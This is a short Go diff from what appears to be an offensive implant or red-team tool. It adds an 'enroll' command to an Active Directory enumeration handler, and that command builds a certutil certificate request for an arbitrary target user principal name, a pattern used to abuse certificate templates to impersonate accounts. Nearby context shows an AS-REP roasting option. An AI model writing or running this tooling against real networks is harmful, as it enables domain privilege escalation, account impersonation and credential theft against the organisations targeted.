@@ -1902,6 +1902,17 @@ func runAdEnum(conn net.Conn, sess *crypto.Session, ae proto.AdEnumStart) {
 		for _, e := range tpls {
 			sendEntry(e)
 		}
+	case "enroll":
+		if ae.TargetUPN == "" {
+			sendMsg("adcs enroll: TargetUPN required (pass -ad-upn)", false, true)
+			return
+		}
+		if ae.BaseDN == "" && ae.TargetDN == "" {
+			sendMsg("adcs enroll: template DN required (pass -ad-target or name)", false, true)
+			return
+		}
+		cmd := adgo.CertUtilEnrollCommand(ae.Host, ae.TargetDN, ae.TargetUPN)
+		sendMsg(cmd, true, false)
 	case "asrep_roast":
 		if ae.RoastUser == "" || ae.RoastDC == "" {
 			sendMsg("asrep_roast requires --roast-user and --roast-dc", false, true)
